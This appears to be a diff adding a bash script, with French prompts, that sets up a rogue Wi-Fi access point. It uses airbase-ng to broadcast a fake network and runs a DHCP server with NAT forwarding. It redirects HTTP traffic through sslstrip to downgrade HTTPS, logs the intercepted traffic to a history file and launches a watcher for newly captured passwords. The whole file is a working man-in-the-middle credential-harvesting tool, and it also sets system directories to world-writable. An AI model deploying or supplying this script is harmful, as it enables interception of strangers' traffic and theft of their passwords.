@@ -1,0 +1,89 @@
+﻿#!/bin/bash
+
+# Colored dialogs
+GREEN="\033[1;32m"
+RED="\033[1;31m"
+END="\033[1;37m"
+
+DIRECTORY="history"
+OUT_FILE=$DIRECTORY/`date +%G-%m-%d-%H:%M:%S`
+
+if [ ! -d "$DIRECTORY" ]; then
+    mkdir $DIRECTORY
+fi
+
+killall -9 dhcpd tcpdump airbase-ng dhcpd3
+service apache2 stop
+airmon-ng stop wlan1
+airmon-ng stop wlan0
+airmon-ng stop mon0
+airmon-ng stop mon1
+airmon-ng stop mon2
+# airmon-ng stop mon3
+# airmon-ng stop mon4
+# airmon-ng stop mon5
+# airmon-ng stop mon6
+# rmmod rtl8187
+# modprobe r8187se
+modprobe rtl8187
+echo 1 > /proc/sys/net/ipv4/ip_forward;
+
+if [[ $1 = "--new" ]]; then
+    echo ">>> Interface Rogue ? ";
+    read WIFACE
+    echo
+    echo
+    echo ">>> Nom de la Rogue_AP ? "
+    read NAME_AP
+    echo
+    echo
+    echo ">>> Channel de la Rogue_AP ?"
+    read CHANNEL
+    echo
+    echo
+    echo ">>> Interface possedant internet ?"
+    read NET_INTERFACE
+else
+    source ./rogueAP.conf
+fi
+
+airmon-ng start $WIFACE;
+modprobe tun;
+
+xterm -hold -e airbase-ng -P -C 30 -c $CHANNEL -e $NAME_AP -v $WIFACE &>/dev/null &
+sleep 2
+
+echo ">>> SCRIPT EN COURS D'ÉXÉCUTION <<<"
+modprobe tun ;
+ifconfig at0 up ;
+ifconfig at0 10.0.0.1 netmask 255.255.255.0 ;
+ifconfig at0 mtu 1400 ;
+route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1 ;
+
+service apache2 start;
+
+chmod 777 /var && chmod 777 /var/run && chmod 777 /etc/dhcp3/dhcpd.conf
+xterm -hold -e dhcpd3 -d -f -cf /etc/dhcp3/dhcpd.conf  &> /dev/null &
+
+sleep 2
+
+iptables --flush ;
+iptables --table nat --flush ;
+iptables --delete-chain ;
+iptables --table nat --delete-chain ;
+#iptables --table nat --append POSTROUTING --out-interface $WIFACE -j MASQUERADE ;
+iptables --table nat --append POSTROUTING --out-interface $NET_INTERFACE -j MASQUERADE ;
+iptables --append FORWARD --in-interface at0 -j ACCEPT ;
+iptables -t nat -A PREROUTING -p udp -j DNAT --to 208.67.222.222;
+
+#xterm -hold -e dnsspoof -i at0 -f /root/Desktop/dns.txt &> /dev/null &
+#sleep 2 
+
+# w: output file
+# a: all http and ssl
+# f: favicon
+# k: force deco
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+xterm -hold -e sslstrip -w $OUT_FILE -a -f -k &
+
+xterm -hold -e ./watch_new_password.sh $OUT_FILE &
